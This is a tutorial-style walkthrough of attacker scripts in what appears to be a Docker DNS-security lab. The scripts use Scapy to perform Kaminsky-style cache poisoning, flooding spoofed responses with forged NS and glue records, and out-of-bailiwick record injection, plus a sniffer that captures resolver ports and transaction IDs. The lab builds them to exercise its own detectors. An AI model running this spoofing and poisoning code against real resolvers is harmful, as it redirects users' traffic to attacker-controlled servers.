# Phase 6 Explained — Line by Line

This document walks through every file created or modified in Phase 6 and explains what each line does and why it's there. Read this alongside the actual files.

---

## High-Level Architecture

Phases 3, 4, and 5 built passive heuristics. Phase 6 introduces the offensive side of the lab: attacker scripts that generate the exact classes of traffic those heuristics are meant to observe.

There are two attack tools in this phase:

1. `kaminsky_flood.py` — repeatedly triggers random-subdomain resolver queries and floods spoofed responses that try to win the cache-poisoning race.
2. `bailiwick_inject.py` — crafts a forged response with an injected out-of-bailiwick additional record.

Both scripts share a small helper module for:

- domain normalization
- random-subdomain generation
- triggering resolver queries
- optionally sniffing the resolver's outgoing query to discover the authoritative server IP, resolver source port, and TXID

```
Attacker container
├── attack_utils.py
│   ├── trigger resolver query
│   ├── generate random subdomain
│   └── sniff resolver query context
├── kaminsky_flood.py
│   ├── build spoofed answer
│   ├── forged NS authority record
│   └── forged glue additional record
└── bailiwick_inject.py
    ├── build correct answer
    └── inject unrelated additional A record
```

This phase matters because it gives the detector something realistic to watch:

- Phase 3 should see suspicious duplicate or unsolicited responses
- Phase 4 should see the random-subdomain burst
- Phase 5 should see the out-of-bailiwick injected record

---

## Files Added or Modified in Phase 6

Phase 6 touched these files:

- `attacker/attack_utils.py`
- `attacker/kaminsky_flood.py`
- `attacker/bailiwick_inject.py`
- `attacker/Dockerfile`
- `tests/test_attacker_packets.py`

No new Python dependencies were needed beyond `scapy` and `dnspython`, which were already present in the attacker image.

---

## `attacker/attack_utils.py`

This file holds shared helper functions used by both attacker scripts.

### Imports

```python
import random
import string
import threading
import time
from typing import Any

import dns.message
import dns.query
from scapy.all import DNS, DNSQR, IP, UDP, sniff
```

These imports support four jobs:

- building random subdomain labels
- firing off resolver queries in the background
- sending real DNS trigger queries with `dnspython`
- sniffing outgoing resolver traffic with Scapy

Using a shared utility module avoids copying the same support logic into both attack scripts.

---

### Domain normalization helper

```python
def normalize_domain(name: str) -> str:
    return name.rstrip(".").lower().strip()
```

This keeps domain formatting consistent everywhere in the attacker tooling.

It:

- removes a trailing root dot
- lowercases the name
- trims whitespace

This matters because both sniffing and packet crafting need stable string comparisons.

---

### FQDN helper

```python
def fqdn(name: str) -> str:
    normalized = normalize_domain(name)
    return f"{normalized}." if normalized else ""
```

Many DNS packet fields are easiest to build as fully qualified domain names with a trailing dot.

This helper converts a normalized domain like `example.com` into `example.com.`.

That keeps packet-construction code readable and avoids scattered `+ "."` logic.

---

### Parent-domain helper

```python
def extract_parent_domain(query_name: str) -> str:
```

This applies the same simple last-two-label logic used elsewhere in the project.

For example:

- `abc.random.example.com` becomes `example.com`
- `example.com` stays `example.com`

The Kaminsky flood script uses this when building a forged authority record for the target zone.

---

### Random-subdomain generator

```python
def random_subdomain(target_domain: str, length: int = 8) -> str:
```

This creates the fresh cache-miss names needed for a Kaminsky-style trigger.

```python
    label = "".join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{label}.{normalize_domain(target_domain)}"
```

Each call returns a distinct name like:

- `k9x2q4zm.example.com`
- `r31a9c8p.example.com`

That matters because a Kaminsky attack works by forcing the resolver to ask about many never-before-seen names under the same parent domain.

---

### Resolver-query trigger

```python
def trigger_resolver_query(query_name: str, resolver_ip: str, timeout: float = 1.0) -> None:
```

This helper sends a real DNS query to the resolver so Unbound will recurse upstream.

```python
    message = dns.message.make_query(normalize_domain(query_name), "A")
```

This builds a standard DNS `A` query using `dnspython`.

```python
    try:
        dns.query.udp(message, resolver_ip, timeout=timeout, ignore_unexpected=True)
    except Exception:
        # Timeouts and DNS failures are fine here; the point is to trigger recursion.
        pass
```

The purpose is not to get a clean client-side answer. The purpose is simply to cause Unbound to emit an upstream `resolver_query`.

That is why exceptions are swallowed here: from the attacker's perspective, the trigger succeeded as long as the resolver started resolution.

---

### Query-context discovery helper

```python
def discover_query_context(
    query_name: str,
    resolver_ip: str,
    iface: str | None = None,
    timeout: float = 3.0,
) -> dict[str, Any]:
```

This helper performs a useful lab trick:

1. trigger a real query to the resolver
2. sniff the resolver's outgoing upstream packet
3. extract the authoritative server IP, resolver source port, and TXID from that packet

That gives the attacker realistic context for forging a response.

```python
    expected_name = normalize_domain(query_name)
```

This is the name the sniffer will look for.

```python
    def fire_query() -> None:
        time.sleep(0.05)
        trigger_resolver_query(query_name, resolver_ip, timeout=timeout)
```

The query is fired from a background thread after a tiny delay so the sniffer can start first.

That avoids a race where the outgoing resolver query leaves before sniffing begins.

```python
    worker = threading.Thread(target=fire_query, daemon=True)
    worker.start()
```

This launches the trigger query in the background.

```python
    packets = sniff(
        iface=iface,
        timeout=timeout,
        count=1,
        store=True,
        lfilter=lambda pkt: _matches_query(pkt, expected_name, resolver_ip),
    )
```

Scapy listens for one matching packet:

- sent by the resolver
- destined for UDP port 53
- containing the expected query name

The `iface` argument is optional so the script can be used on different network interfaces in Docker.

```python
    if not packets:
        raise RuntimeError(
            f"did not observe resolver query for {expected_name} within {timeout:.1f}s"
        )
```

If sniffing times out, the script fails clearly instead of silently using bad defaults.

```python
    packet = packets[0]
    return {
        "query_name": expected_name,
        "auth_server_ip": packet[IP].dst,
        "resolver_port": packet[UDP].sport,
        "txid": packet[DNS].id,
    }
```

This is the useful attacker context:

- `auth_server_ip`: the authoritative server the resolver contacted
- `resolver_port`: the resolver's chosen source port for the upstream query
- `txid`: the resolver's DNS transaction ID for that query

The Kaminsky flood script reuses the authoritative server IP and, optionally, the resolver port. The bailiwick-injection script can reuse all three values directly.

---

### Packet-match helper

```python
def _matches_query(packet, expected_name: str, resolver_ip: str) -> bool:
```

This helper keeps the sniffing filter readable and testable.

```python
    if not (
        packet.haslayer(IP)
        and packet.haslayer(UDP)
        and packet.haslayer(DNS)
        and packet.haslayer(DNSQR)
    ):
        return False
```

Only packets with the expected layers are interesting.

```python
    dns_layer = packet[DNS]
    if dns_layer.qr != 0 or packet[UDP].dport != 53 or packet[IP].src != resolver_ip:
        return False
```

This narrows the match to outgoing DNS queries from the resolver:

- `qr == 0` means it is a query, not a response
- destination UDP port `53` means it is headed to an upstream DNS server
- the packet source IP must match the resolver

```python
    qname = dns_layer[DNSQR].qname
    if isinstance(qname, bytes):
        qname = qname.decode(errors="ignore")
```

Scapy may expose `qname` as bytes, so this normalizes it into a string for comparison.

```python
    return normalize_domain(str(qname)) == expected_name
```

This is the final check: only accept packets for the exact query name we triggered.

---

## `attacker/kaminsky_flood.py`

This is the main Kaminsky-style attacker script.

It has three jobs:

1. trigger a random-subdomain query at the resolver
2. flood spoofed upstream responses for that query
3. repeat

---

### Imports

```python
import argparse
import threading
import time

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send
```

- `argparse` gives the script configurable parameters
- `threading` lets the trigger query and spoof flood overlap in time
- `time` supports small delays between trigger and flood
- Scapy is used to build and send forged packets

```python
from attack_utils import (
    discover_query_context,
    extract_parent_domain,
    fqdn,
    random_subdomain,
    trigger_resolver_query,
)
```

These shared helpers keep the script focused on attack logic rather than support code.

---

### Packet-crafting function

```python
def craft_spoofed_response(
    resolver_ip: str,
    resolver_port: int,
    auth_server_ip: str,
    query_name: str,
    spoofed_ip: str,
    txid: int,
    delegated_domain: str | None = None,
    delegated_ns: str = "ns1.attacker.net",
    delegated_ns_ip: str = "6.6.6.6",
    ttl: int = 300,
):
```

This builds one forged DNS response packet.

The parameters map directly to the attack:

- `resolver_ip`: where to send the forged reply
- `resolver_port`: the resolver's upstream source port
- `auth_server_ip`: the IP to impersonate as the authoritative server
- `query_name`: the random subdomain currently being targeted
- `spoofed_ip`: the attacker's desired answer for the query
- `txid`: the guessed DNS transaction ID
- `delegated_ns` / `delegated_ns_ip`: the malicious nameserver and glue data used to poison delegation

```python
    query_fqdn = fqdn(query_name)
    delegated_zone = fqdn(delegated_domain or extract_parent_domain(query_name))
    delegated_ns_fqdn = fqdn(delegated_ns)
```

This normalizes the key DNS names used in the packet:

- the exact query name
- the parent zone being targeted
- the malicious nameserver hostname

```python
    answer = DNSRR(rrname=query_fqdn, type="A", ttl=ttl, rdata=spoofed_ip)
```

This is the forged direct answer to the random subdomain query.

```python
    authority = DNSRR(rrname=delegated_zone, type="NS", ttl=ttl, rdata=delegated_ns_fqdn)
    additional = DNSRR(rrname=delegated_ns_fqdn, type="A", ttl=ttl, rdata=delegated_ns_ip)
```

These are the most important poisoning components:

- an `NS` record claiming the target zone is served by an attacker-controlled nameserver
- a glue `A` record giving that nameserver an IP address

That is how the script models a full Kaminsky-style delegation attack rather than just spoofing one `A` answer.

```python
    dns = DNS(
        id=txid,
        qr=1,
        aa=1,
        rd=0,
        ra=0,
        qdcount=1,
        ancount=1,
        nscount=1,
        arcount=1,
        qd=DNSQR(qname=query_fqdn, qtype="A"),
        an=answer,
        ns=authority,
        ar=additional,
    )
```

This builds the DNS layer:

- `id=txid`: the transaction ID guess
- `qr=1`: mark this as a response
- `aa=1`: mark it as authoritative
- `qd`, `an`, `ns`, `ar`: populate the question, answer, authority, and additional sections

```python
    return IP(src=auth_server_ip, dst=resolver_ip) / UDP(sport=53, dport=resolver_port) / dns
```

This wraps the DNS payload in a forged IP/UDP packet:

- source IP is spoofed as the authoritative server
- source port is `53`
- destination port is the resolver's upstream source port

That is exactly the packet shape the resolver is expecting from an upstream answer.

---

### Flood sender

```python
def send_spoof_flood(... ) -> int:
```

This builds and sends a whole batch of spoofed replies across a TXID range.

```python
    packets = [
        craft_spoofed_response(...)
        for txid in range(txid_start, txid_start + txid_count)
    ]
```

This is the core Kaminsky brute-force step: try many transaction IDs for the same query.

```python
    send(packets, verbose=False, inter=inter_packet_delay)
    return len(packets)
```

Scapy sends the entire batch, optionally spacing packets out with a tiny inter-packet delay.

The function returns the number of packets sent so the caller can log attack progress.

---

### Attack runner

```python
def run_attack(args: argparse.Namespace) -> None:
```

This is the main script entry point.

---

### Optional context discovery

```python
    auth_server_ip = args.auth_server_ip
    resolver_port = args.resolver_port

    if args.discover or auth_server_ip is None or resolver_port is None:
```

The script can either:

- use values supplied explicitly by the user
- or sniff a probe query to discover them automatically

```python
        probe_name = random_subdomain(args.target_domain)
        context = discover_query_context(...)
```

The probe query generates one real resolver lookup under the target domain so the attacker can observe the upstream context.

```python
        auth_server_ip = auth_server_ip or context["auth_server_ip"]
        resolver_port = resolver_port or context["resolver_port"]
```

If the user did not supply those values, the script fills them in from the sniffed packet.

This is especially convenient in the weak configuration where the resolver source port is fixed.

---

### Attack loop

```python
    for attempt in range(args.attempts):
        query_name = random_subdomain(args.target_domain)
```

Each attempt chooses a fresh random subdomain so the resolver cannot satisfy it from cache.

That is exactly what creates repeated upstream resolution opportunities in a Kaminsky attack.

```python
        worker = threading.Thread(
            target=trigger_resolver_query,
            args=(query_name, args.resolver_ip, args.query_timeout),
            daemon=True,
        )
        worker.start()
```

This launches the trigger query in the background.

We want the resolver to begin its upstream query while the spoof flood is being sent, so the two actions need to overlap.

```python
        time.sleep(args.pre_flood_delay)
```

This tiny pause gives Unbound a moment to issue the upstream query before the spoof flood begins.

In practice, this is a tuning knob for the race timing.

```python
        packet_count = send_spoof_flood(...)
```

This sends the forged response batch for the current random name.

```python
        worker.join(timeout=args.query_timeout + 0.2)
```

Wait briefly for the background query thread to finish.

The exact client-side result does not matter much here; the goal is to keep the attack loop moving.

```python
        print(
            f"[attempt {attempt + 1}/{args.attempts}] qname={query_name} "
            f"flooded_packets={packet_count} auth_server_ip={auth_server_ip} "
            f"resolver_port={resolver_port}",
            flush=True,
        )
```

This prints a simple progress line so the operator can see which query name was used and how many spoofed packets were sent.

---

### CLI builder

```python
def build_parser() -> argparse.ArgumentParser:
```

This defines the script's command-line interface.

Key parameters:

- `--resolver-ip`
- `--resolver-port`
- `--auth-server-ip`
- `--target-domain`
- `--spoofed-ip`
- `--delegated-ns`
- `--delegated-ns-ip`
- `--attempts`
- `--txid-start`
- `--txid-count`
- `--discover`

This keeps the tool flexible enough for weak and hardened lab configurations.

---

## `attacker/bailiwick_inject.py`

This script models a simpler forged-response attack that is specifically useful for testing the Phase 5 detector.

Instead of flooding many TXIDs, it:

1. triggers one resolver query
2. learns the exact upstream context by sniffing it
3. sends a forged response containing an unrelated additional record

---

### Imports

```python
import argparse

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send

from attack_utils import discover_query_context, fqdn
```

This script is intentionally smaller than the Kaminsky flood tool. It reuses the shared discovery helper and focuses on crafting one specific kind of malicious response.

---

### Packet-crafting function

```python
def craft_bailiwick_injection_response(
    resolver_ip: str,
    resolver_port: int,
    auth_server_ip: str,
    query_name: str,
    answer_ip: str,
    injected_name: str,
    injected_ip: str,
    txid: int,
    ttl: int = 300,
):
```

This builds one forged response packet.

The packet contains:

- a plausible answer for the original query
- an unrelated additional `A` record for another domain

```python
    query_fqdn = fqdn(query_name)
    injected_fqdn = fqdn(injected_name)
```

Normalize the queried domain and injected domain to fully qualified form.

```python
    answer = DNSRR(rrname=query_fqdn, type="A", ttl=ttl, rdata=answer_ip)
    injected = DNSRR(rrname=injected_fqdn, type="A", ttl=ttl, rdata=injected_ip)
```

The answer is the "legitimate-looking" part of the response.

The injected record is the suspicious out-of-bailiwick payload the detector should notice.

```python
    dns = DNS(
        id=txid,
        qr=1,
        aa=1,
        rd=0,
        ra=0,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=1,
        qd=DNSQR(qname=query_fqdn, qtype="A"),
        an=answer,
        ar=injected,
    )
```

This creates a response with:

- one question
- one answer
- no authority records
- one additional record

That shape is enough to exercise the Phase 5 detector without having to build a full referral packet.

```python
    return IP(src=auth_server_ip, dst=resolver_ip) / UDP(sport=53, dport=resolver_port) / dns
```

Just like the Kaminsky flood packet, this is forged to look like it came from the authoritative server.

---

### Injection runner

```python
def run_injection(args: argparse.Namespace) -> None:
```

This is the script's main entry point.

```python
    context = discover_query_context(
        args.query_name,
        resolver_ip=args.resolver_ip,
        iface=args.iface,
        timeout=args.discovery_timeout,
    )
```

Unlike the Kaminsky flood, this script uses live sniffing on the exact query it is about to target.

That gives it the actual:

- authoritative server IP
- resolver source port
- TXID

for the live request being answered.

```python
    auth_server_ip = args.auth_server_ip or context["auth_server_ip"]
    resolver_port = args.resolver_port or context["resolver_port"]
    txid = args.txid if args.txid is not None else context["txid"]
```

The user can override any of these, but by default the script uses the sniffed values.

That makes the attack more reliable in the lab.

```python
    packet = craft_bailiwick_injection_response(...)
```

Build the forged response with the desired injected record.

```python
    for _ in range(args.repeat):
        send(packet, verbose=False)
```

Send the same forged packet a few times to improve the chances of landing the race.

```python
    print(
        "sent bailiwick injection:",
        f"query_name={args.query_name}",
        f"resolver_port={resolver_port}",
        f"auth_server_ip={auth_server_ip}",
        f"txid={txid}",
        f"injected_name={args.injected_name}",
        flush=True,
    )
```

This prints the most relevant attack details for the operator.

---

### CLI builder

```python
def build_parser() -> argparse.ArgumentParser:
```

The main parameters are:

- `--query-name`
- `--answer-ip`
- `--injected-name`
- `--injected-ip`
- `--repeat`
- `--resolver-ip`
- `--auth-server-ip`
- `--resolver-port`
- `--txid`

The defaults are chosen to make the script easy to run as a lab demonstration without lots of setup.

---

## `attacker/Dockerfile`

Phase 6 updates the attacker image so the new scripts are actually available inside the container.

### Before

```dockerfile
COPY placeholder.py /app/placeholder.py
```

Previously the image copied only the placeholder script.

That was enough for the earlier scaffold phase, but not enough once the attacker gained multiple real scripts and a shared helper module.

### After

```dockerfile
COPY . /app/
```

Now the whole attacker directory is copied into the container.

That ensures these files are present at runtime:

- `placeholder.py`
- `attack_utils.py`
- `kaminsky_flood.py`
- `bailiwick_inject.py`

The default command still launches `placeholder.py`, which is fine because the attack scripts are meant to be run manually with `docker compose exec attacker python3 ...`.

---

## `tests/test_attacker_packets.py`

This file provides lightweight local validation that the attack scripts are crafting the packet structures we expect.

It does not try to prove a full live attack succeeds. It simply checks that the packet contents are sane before you ever run Docker.

---

### Imports and path setup

```python
import sys

from scapy.all import DNS

sys.path.insert(0, "attacker")
```

This lets the tests import the attacker scripts directly from the repo.

---

### Packet import targets

```python
from bailiwick_inject import craft_bailiwick_injection_response
from kaminsky_flood import craft_spoofed_response
```

The tests focus on the core packet-building functions rather than the full runtime scripts.

That keeps them fast and deterministic.

---

### Text helper

```python
def _text(value) -> str:
    if isinstance(value, bytes):
        return value.decode(errors="ignore")
    return str(value)
```

Scapy sometimes represents DNS fields as bytes and sometimes as strings.

This helper normalizes those values so assertions stay readable.

---

### Test: Kaminsky flood packet shape

```python
def test_craft_spoofed_response_has_answer_authority_and_glue() -> None:
```

This verifies that the forged Kaminsky packet contains all the expected sections:

- a question
- an answer
- an authority `NS` record
- an additional glue `A` record

It also verifies:

- source IP is the spoofed authoritative server
- destination IP is the resolver
- destination port is the resolver's upstream source port
- the DNS transaction ID is set correctly

That gives confidence that the script is constructing the kind of packet the detector is meant to observe.

---

### Test: bailiwick-injection packet shape

```python
def test_craft_bailiwick_injection_response_has_unrelated_additional_record() -> None:
```

This verifies that the simpler injection packet contains:

- the original query
- a plausible answer
- an unrelated additional record

That is exactly the shape Phase 5's `BailiwickEnforcer` is supposed to catch.

---

## Attack Logic Summary

Phase 6 introduces two complementary attacker workflows.

### Kaminsky flood

```python
for each random subdomain:
    trigger resolver query
    wait a tiny moment
    send many forged responses with different TXIDs
```

This is what creates:

- random-subdomain bursts for Phase 4
- suspicious response races for Phase 3
- delegation/glue injection attempts for Phase 5

### Bailiwick injection

```python
trigger one resolver query
sniff the exact upstream context
send a forged response with a normal answer plus an unrelated additional record
```

This is a tighter, more controlled way to exercise the bailiwick detector.

---

## Why Include Both Attack Scripts?

The Kaminsky flood is useful because it models the broader poisoning strategy:

- force fresh upstream queries
- race spoofed answers
- try to inject malicious delegation data

The bailiwick injection tool is useful because it isolates the structural response-manipulation part of the attack and makes Phase 5 easier to demonstrate.

Together they let you test:

- attack attempts that spray many queries
- attack attempts that focus on one malicious response shape

---

## Why Sniff Resolver Context at All?

In a real blind spoofing attack, the attacker should not know the resolver's TXID and source port.

But in this Docker lab:

- the attacker container is on the same network
- we want to demonstrate detector behavior reliably
- we want practical scripts that can show success and failure modes

So the shared sniffing helper serves as a lab convenience. It helps discover:

- which authoritative server IP to impersonate
- which source port the resolver used
- which TXID was on the wire

That makes the attacker tooling much more usable for demos and experiments.

---

## What Phase 6 Does Not Do Yet

Phase 6 gives you attack simulators, but it still does not:

- automatically verify attack success against outside trusted resolvers
- orchestrate full experiments end-to-end from one command
- persist attack results in a report
- adaptively tune timing based on observed network conditions
- guarantee success against hardened configurations

Those are either operational concerns or later-phase verification concerns.

Phase 6's job is to generate realistic malicious DNS traffic that can exercise the detector.

---

## What Changed From Phase 5

Phase 5 finished the passive detector logic.

Phase 6 adds the offensive half of the lab.

That changes the project from:

- "a resolver plus a detector"

to:

- "a resolver, a detector, and attacker tooling that can actively generate the behaviors the detector is supposed to recognize"

That is the step that makes the project feel like a full end-to-end security experiment rather than just a parser and some heuristics.
